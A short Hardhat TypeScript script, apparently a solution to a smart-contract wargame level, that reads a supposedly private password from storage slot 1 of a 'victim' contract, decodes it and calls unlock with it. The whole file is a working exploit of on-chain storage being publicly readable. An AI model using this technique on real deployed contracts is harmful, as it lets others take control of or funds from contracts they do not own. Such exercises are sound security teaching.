import { ethers } from "hardhat";
import { Contract } from "ethers";

const helper = async (victim: Contract) => {
  const data1 = await victim.provider.getStorageAt(victim.address, 1);
  console.log(`Data at slot 1: ${data1}`);

  const decoded = ethers.utils.toUtf8String(data1);
  console.log(`Decoded: ${decoded}`);

  await victim.unlock(data1);
};

export default helper;
